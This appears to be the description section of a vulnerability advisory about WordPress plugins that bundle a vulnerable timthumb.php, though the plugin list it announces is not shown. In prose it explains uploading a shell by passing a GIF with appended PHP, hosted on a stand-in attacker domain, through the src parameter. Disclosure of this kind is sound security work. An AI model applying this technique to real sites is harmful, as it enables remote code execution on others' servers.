Description
---
The following Wordpress plugins reuse a vulnerable version of the timthumb.php library.

By hosting a malicious GIF file with PHP code appended to the end on an attacker controlled
domain such as blogger.com.evil.com and then providing it to the script through the
src GET parameter, it is possible to upload a shell and execute arbitrary code on the webserver.
